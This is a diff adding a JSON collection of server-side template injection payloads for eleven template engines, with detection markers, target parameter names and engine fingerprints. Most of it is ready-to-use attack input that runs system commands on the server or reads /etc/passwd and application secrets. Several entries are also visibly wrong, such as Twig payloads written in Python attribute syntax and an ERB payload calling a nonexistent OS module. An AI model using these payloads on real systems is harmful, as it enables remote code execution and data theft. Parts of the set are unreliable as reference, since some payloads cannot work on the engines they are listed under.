@@ -1,0 +1,158 @@
+{
+  "info": {
+    "name": "SSTI Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Server-Side Template Injection payloads for 10+ template engines including Jinja2, Twig, Smarty, ERB, FreeMarker, and more. 2026 updated.",
+    "category": "Injection",
+    "severity": "CRITICAL",
+    "owasp": "A03:2021 - Injection"
+  },
+  "payloads": {
+    "jinja2": [
+      {"payload": "{{7*7}}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "{{config}}", "expect": "<Config", "description": "Config object access", "encoding": "none"},
+      {"payload": "{{config.items()}}", "expect": "dict", "description": "Config items", "encoding": "none"},
+      {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "expect": "<class", "description": "Class traversal", "encoding": "none"},
+      {"payload": "{{''.__class__.__bases__[0].__subclasses__()}}", "expect": "<class", "description": "Base classes", "encoding": "none"},
+      {"payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}", "expect": "uid=", "description": "RCE via cycler", "encoding": "none"},
+      {"payload": "{{ joiner.__init__.__globals__.os.popen('id').read() }}", "expect": "uid=", "description": "RCE via joiner", "encoding": "none"},
+      {"payload": "{{ lipsum.__globals__.os.popen('id').read() }}", "expect": "uid=", "description": "RCE via lipsum", "encoding": "none"},
+      {"payload": "{% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__=='catch_warnings'%}{{ x.__init__.__globals__['__builtins__']['eval']('id') }}{% endif %}{% endfor %}", "expect": "uid=", "description": "Filter bypass RCE", "encoding": "none"},
+      {"payload": "{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}", "expect": "uid=", "description": "RCE via url_for", "encoding": "none"},
+      {"payload": "{{ get_flashed_messages.__globals__['__builtins__']['eval']('id') }}", "expect": "uid=", "description": "RCE via flask globals", "encoding": "none"},
+      {"payload": "{{ request.__init__.__globals__['__builtins__']['eval']('id') }}", "expect": "uid=", "description": "RCE via request", "encoding": "none"}
+    ],
+    "twig": [
+      {"payload": "{{7*7}}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "{{_self}}", "expect": "Twig", "description": "Self reference", "encoding": "none"},
+      {"payload": "{{_self.env}}", "expect": "environment", "description": "Environment access", "encoding": "none"},
+      {"payload": "{{_self.env.display.class}}", "expect": "class", "description": "Display class", "encoding": "none"},
+      {"payload": "{{_self.env.display.class.__init__.__globals__.__builtins__}}", "expect": "builtins", "description": "Globals access", "encoding": "none"},
+      {"payload": "{{_self.env.display.class.__init__.__globals__['__builtins__']['eval']('id')}}", "expect": "uid=", "description": "RCE via Twig", "encoding": "none"},
+      {"payload": "{{_self.env.include('base')}}", "expect": "template", "description": "Include test", "encoding": "none"},
+      {"payload": "{% import '_self' as x %}{{x.template.from_string('id')}}", "expect": "template", "description": "String import", "encoding": "none"},
+      {"payload": "{{include('base')}}", "expect": "template", "description": "Include base", "encoding": "none"},
+      {"payload": "{{source('_self')}}", "expect": "source", "description": "Source read", "encoding": "none"}
+    ],
+    "smarty": [
+      {"payload": "{7*7}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "{$smarty.version}", "expect": "Smarty", "description": "Smarty version", "encoding": "none"},
+      {"payload": "{php}echo 7*7;{/php}", "expect": "49", "description": "PHP execution", "encoding": "none"},
+      {"payload": "{literal}{{/literal}{php}echo `id`;{/php}", "expect": "uid=", "description": "Backtick exec", "encoding": "none"},
+      {"payload": "{$smarty.template_object->getTemplateVars()}", "expect": "array", "description": "Template vars", "encoding": "none"},
+      {"payload": "{include file='/etc/passwd'}", "expect": "root:", "description": "File include", "encoding": "none"},
+      {"payload": "{fetch file='/etc/passwd'}", "expect": "root:", "description": "Fetch file", "encoding": "none"},
+      {"payload": "{$smarty.capture.default}", "expect": "capture", "description": "Capture access", "encoding": "none"},
+      {"payload": "{math equation='id'}", "expect": "uid=", "description": "Math equation exec", "encoding": "none"},
+      {"payload": "{debug}", "expect": "debug", "description": "Debug output", "encoding": "none"}
+    ],
+    "freemarker": [
+      {"payload": "${7*7}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "${Spring.Bind?string()}", "expect": "spring", "description": "Spring bind", "encoding": "none"},
+      {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('id')}", "expect": "uid=", "description": "RCE via Execute", "encoding": "none"},
+      {"payload": "${stack?eval}", "expect": "stack", "description": "Eval expression", "encoding": "none"},
+      {"payload": "<#list [\"freemarker.template.utility.Execute\"?new()] as x>${x('id')}</#list>", "expect": "uid=", "description": "List RCE", "encoding": "none"},
+      {"payload": "${.data_model?api.getObject('freemarker.template.utility.Execute')?new()('id')}", "expect": "uid=", "description": "API RCE", "encoding": "none"},
+      {"payload": "${.globals?api.get('freemarker.template.utility.Execute')?new()('id')}", "expect": "uid=", "description": "Globals RCE", "encoding": "none"},
+      {"payload": "<#assign x=Request?api.getClass()?new()>${x.getResource('/etc/passwd')}", "expect": "resource", "description": "Class new RCE", "encoding": "none"},
+      {"payload": "${.data_model['com.opensymphony.xwork2.ActionContext'].getContextMap()?api}", "expect": "actioncontext", "description": "ActionContext access", "encoding": "none"},
+      {"payload": "<#if Request??>${Request.getParameter('x')}</#if>", "expect": "request", "description": "Request access", "encoding": "none"}
+    ],
+    "velocity": [
+      {"payload": "#{7*7}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "#set($x=7*7)$x", "expect": "49", "description": "Set variable", "encoding": "none"},
+      {"payload": "#set($e=$eval('7*7'))$e", "expect": "49", "description": "Eval expression", "encoding": "none"},
+      {"payload": "#set($s=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))$s.waitFor().toString()", "expect": "uid=", "description": "RCE via Runtime", "encoding": "none"},
+      {"payload": "#set($str=$class.forName('java.lang.String').getInstance())$str", "expect": "string", "description": "Class forName", "encoding": "none"},
+      {"payload": "#foreach($c in $class.inspect('java.lang.System').getDeclaredFields()) $c #end", "expect": "private", "description": "System fields", "encoding": "none"},
+      {"payload": "#set($m=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))#foreach($b in $m.inputReader().readLines())$b#end", "expect": "uid=", "description": "Reader RCE", "encoding": "none"},
+      {"payload": "$class.inspect('java.lang.ProcessBuilder').getDeclaredMethods()[0].invoke(null,'id').waitFor()", "expect": "process", "description": "ProcessBuilder RCE", "encoding": "none"},
+      {"payload": "#set($proc=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))$proc.waitFor()", "expect": "wait", "description": "WaitFor RCE", "encoding": "none"},
+      {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "expect": "runtime", "description": "T() shorthand RCE", "encoding": "none"}
+    ],
+    "erb": [
+      {"payload": "<%= 7*7 %>", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "<%= system('id') %>", "expect": "uid=", "description": "RCE via system", "encoding": "none"},
+      {"payload": "<%= `id` %>", "expect": "uid=", "description": "Backtick RCE", "encoding": "none"},
+      {"payload": "<%= %x[id] %>", "expect": "uid=", "description": "%x RCE", "encoding": "none"},
+      {"payload": "<%= File.read('/etc/passwd') %>", "expect": "root:", "description": "File read", "encoding": "none"},
+      {"payload": "<%= `#{ENV['CMD']}` %>", "expect": "env", "description": "ENV RCE", "encoding": "none"},
+      {"payload": "<%= Dir.glob('*') %>", "expect": "array", "description": "Dir glob", "encoding": "none"},
+      {"payload": "<%= File.open('/etc/passwd').read %>", "expect": "root:", "description": "File open read", "encoding": "none"},
+      {"payload": "<%= require 'os'; %><%= OS::Underlying.system('id') %>", "expect": "uid=", "description": "Require RCE", "encoding": "none"},
+      {"payload": "<%= `#{ARGV.join(' ')}` %>", "expect": "argv", "description": "ARGV injection", "encoding": "none"}
+    ],
+    "handlebars": [
+      {"payload": "{{7*7}}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "{{#with (lookup . \"x\")}}{{this}}{{/with}}", "expect": "with", "description": "Lookup helper", "encoding": "none"},
+      {"payload": "{{#each (os)}}{{this}}{{/each}}", "expect": "object", "description": "Each os access", "encoding": "none"},
+      {"payload": "{{#with (lookup this 'constructor')}}{{#with (lookup this 'getOwnPropertyDescriptors')}}{{this}}{{/with}}{{/with}}", "expect": "descriptor", "description": "Constructor traversal", "encoding": "none"},
+      {"payload": "{{#with (lookup this '__proto__')}}{{this}}{{/with}}", "expect": "proto", "description": "Proto access", "encoding": "none"},
+      {"payload": "{{#with (lookup this 'toString')}}{{this}}{{/with}}", "expect": "function", "description": "Function access", "encoding": "none"}
+    ],
+    "pug_jade": [
+      {"payload": "#{7*7}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "- console.log(process.version)", "expect": "node", "description": "Process access", "encoding": "none"},
+      {"payload": "- const exec = require('child_process').execSync('id')", "expect": "uid=", "description": "Require exec", "encoding": "none"},
+      {"payload": "- global.process.mainModule.require('child_process').execSync('id')", "expect": "uid=", "description": "Process require RCE", "encoding": "none"},
+      {"payload": "- require('fs').readdirSync('/')", "expect": "bin", "description": "FS readdir", "encoding": "none"},
+      {"payload": "- require('fs').readFileSync('/etc/passwd').toString()", "expect": "root:", "description": "FS readFile", "encoding": "none"},
+      {"payload": "- const p = require('child_process'); p.execSync('id').toString()", "expect": "uid=", "description": "ExecSync RCE", "encoding": "none"},
+      {"payload": "- with(process) { mainModule.require('child_process').execSync('id') }", "expect": "uid=", "description": "With RCE", "encoding": "none"}
+    ],
+    "blade": [
+      {"payload": "{{7*7}}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "{{config}}", "expect": "config", "description": "Config access", "encoding": "none"},
+      {"payload": "{{config('app.key')}}", "expect": "key", "description": "App key access", "encoding": "none"},
+      {"payload": "{{App\\Models\\User::all()}}", "expect": "collection", "description": "Model access", "encoding": "none"},
+      {"payload": "{{__DIR__}}", "expect": "directory", "description": "Directory access", "encoding": "none"},
+      {"payload": "{{$_GET['cmd']}}", "expect": "cmd", "description": "GET param access", "encoding": "none"},
+      {"payload": "@php echo 7*7; @endphp", "expect": "49", "description": "Raw PHP execution", "encoding": "none"},
+      {"payload": "{{Illuminate\\Support\\Facades\\Cache::get('key')}}", "expect": "cache", "description": "Cache facade", "encoding": "none"},
+      {"payload": "{{Route::current()}}", "expect": "route", "description": "Route access", "encoding": "none"},
+      {"payload": "{{request()->input('cmd')}}", "expect": "request", "description": "Request input", "encoding": "none"}
+    ],
+    "mako": [
+      {"payload": "${7*7}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "<% import os %>${os.popen('id').read()}", "expect": "uid=", "description": "Import os RCE", "encoding": "none"},
+      {"payload": "${runtime.exec('id')}", "expect": "runtime", "description": "Runtime exec", "encoding": "none"},
+      {"payload": "<% import subprocess %>${subprocess.check_output('id')}", "expect": "uid=", "description": "Subprocess RCE", "encoding": "none"},
+      {"payload": "${__import__('os').popen('id').read()}", "expect": "uid=", "description": "Import popen RCE", "encoding": "none"},
+      {"payload": "<% import shutil %><% print(shutil.which('sh')) %>", "expect": "shutil", "description": "Shutil access", "encoding": "none"},
+      {"payload": "${__import__('subprocess').check_output(['sh','-c','id'])}", "expect": "uid=", "description": "Check output RCE", "encoding": "none"}
+    ],
+    "pebble": [
+      {"payload": "{{ 7 * 7 }}", "expect": "49", "description": "Basic math evaluation", "encoding": "none"},
+      {"payload": "{{ 1.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}", "expect": "process", "description": "Java RCE", "encoding": "none"},
+      {"payload": "{{ \"freemarker.template.utility.Execute\"?new()(\"id\") }}", "expect": "uid=", "description": "Execute RCE", "encoding": "none"},
+      {"payload": "{{ context.getBean('dataSource').getConnection().createStatement().executeQuery('id') }}", "expect": "query", "description": "Bean access RCE", "encoding": "none"}
+    ]
+  },
+  "detection_order": [
+    {"engine": "jinja2", "marker": "{{7*7}}", "expected": "49", "confidence": "high"},
+    {"engine": "twig", "marker": "{{7*7}}", "expected": "49", "confidence": "high"},
+    {"engine": "smarty", "marker": "{7*7}", "expected": "49", "confidence": "medium"},
+    {"engine": "freemarker", "marker": "${7*7}", "expected": "49", "confidence": "high"},
+    {"engine": "velocity", "marker": "#{7*7}", "expected": "49", "confidence": "medium"},
+    {"engine": "erb", "marker": "<%= 7*7 %>", "expected": "49", "confidence": "high"},
+    {"engine": "handlebars", "marker": "{{7*7}}", "expected": "49", "confidence": "low"},
+    {"engine": "pug", "marker": "#{7*7}", "expected": "49", "confidence": "medium"},
+    {"engine": "blade", "marker": "{{7*7}}", "expected": "49", "confidence": "high"},
+    {"engine": "mako", "marker": "${7*7}", "expected": "49", "confidence": "high"}
+  ],
+  "parameters": [
+    "template", "view", "render", "page", "layout", "partial",
+    "content", "file", "format", "style", "theme", "widget", "component"
+  ],
+  "fingerprint_responses": {
+    "jinja2": ["jinja2", "TEMPLATE", "templating"],
+    "twig": ["twig", "Symfony", "Twig"],
+    "smarty": ["smarty", "Smarty"],
+    "freemarker": ["freemarker", "FreeMarker", "Spring"],
+    "velocity": ["velocity", "Apache Velocity"],
+    "erb": ["erb", "Ruby"],
+    "handlebars": ["handlebars", "hbs"],
+    "blade": ["blade", "Laravel"]
+  }
+}
